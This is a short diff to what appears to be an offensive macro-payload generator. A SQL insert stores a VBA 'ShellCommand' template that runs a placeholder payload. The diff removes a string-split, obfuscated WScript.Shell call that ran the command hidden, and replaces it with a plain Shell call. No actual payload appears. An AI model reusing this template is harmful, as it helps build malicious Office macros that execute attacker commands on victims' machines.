@@ -440,8 +440,7 @@ INSERT INTO CodeBlocks (Name, BlockType, BlockText) Values ('ShellCommand', 'har
 Sub |RANDOMNAME|()
     Dim c As String
     c = Chr(34) & |PAYLOADTEXT| & Chr(34)
-    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
-    s.Run c, 0
+    Shell(c)
 End Sub
 
 ');
